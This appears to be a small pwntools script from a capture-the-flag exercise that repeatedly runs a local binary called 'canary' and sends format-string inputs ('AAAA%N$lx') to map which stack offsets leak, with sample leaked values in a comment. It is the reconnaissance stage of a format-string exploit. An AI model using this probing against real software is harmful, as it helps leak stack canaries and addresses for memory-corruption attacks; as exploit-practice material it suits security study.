from pwn import *
from fuzz import printf

context.terminal = ['terminator', '-e']


arr=[]
for i in range(1, 100):
    p = process('../canary')
    p.recvuntil(b'protector!\n')
    p.sendline("AAAA%{}$lx".format(i))
    arr.append(p.recvline().decode().strip())
    p.close()


pprint(arr)
#['AAAAc','AAAA0','AAAA80491e6','AAAAf7ff5b9c','AAAA1','AAAAf7f37720','AAAA41414141','AAAA6c243825','AAAA78',...]
 
# a=printf(arr)
# a.main()